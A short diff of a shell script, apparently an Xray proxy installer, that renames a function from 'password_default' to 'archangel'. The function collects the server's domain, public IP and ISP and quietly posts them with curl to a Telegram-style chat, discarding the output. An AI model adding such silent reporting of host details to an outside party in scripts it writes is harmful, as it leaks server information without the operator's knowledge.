@@ -331,7 +331,7 @@ sayaGanteng > /dev/null 2>&1
     export Kernel=$( uname -r )
     export Arch=$( uname -m )
     export IP=$( curl -s https://ipinfo.io/ip/ )
-function password_default() {
+function archangel() {
     domain=$(cat /etc/xray/domain)
     MYIP=$(curl -sS ipv4.icanhazip.com)
     ISP=$(wget -qO- ipinfo.io/org)
@@ -374,4 +374,4 @@ function password_default() {
 
    curl -s --max-time $TIME -d "chat_id=$CHATID&disable_web_page_preview=1&text=$TEXT&parse_mode=html" $URL >/dev/null
 }
-password_default
+archangel
